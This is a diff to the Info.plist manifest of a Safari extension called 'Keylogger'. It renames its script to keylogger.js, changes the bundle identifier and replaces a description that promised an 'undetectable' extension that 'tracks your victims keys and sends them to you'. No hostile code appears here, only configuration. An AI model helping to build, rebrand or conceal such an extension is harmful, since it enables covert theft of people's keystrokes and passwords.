@@ -9,7 +9,7 @@
 	<key>CFBundleDisplayName</key>
 	<string>Keylogger</string>
 	<key>CFBundleIdentifier</key>
-	<string>com.yourcompany.keylogger</string>
+	<string>com.kirshapps.keylogger</string>
 	<key>CFBundleInfoDictionaryVersion</key>
 	<string>6.0</string>
 	<key>CFBundleShortVersionString</key>
@@ -27,7 +27,7 @@
 		<dict>
 			<key>End</key>
 			<array>
-				<string>main.js</string>
+				<string>keylogger.js</string>
 			</array>
 			<key>Start</key>
 			<array>
@@ -37,7 +37,7 @@
 		</dict>
 	</dict>
 	<key>Description</key>
-	<string>This undetectable Safari Extension tracks your victims keys and sends them to you.</string>
+	<string>A simple Keylogger for Safari</string>
 	<key>DeveloperIdentifier</key>
 	<string>B7A79B695Q</string>
 	<key>ExtensionInfoDictionaryVersion</key>
@@ -52,5 +52,7 @@
 			<string>All</string>
 		</dict>
 	</dict>
+	<key>Website</key>
+	<string>http://kirshapps.github.io</string>
 </dict>
 </plist>
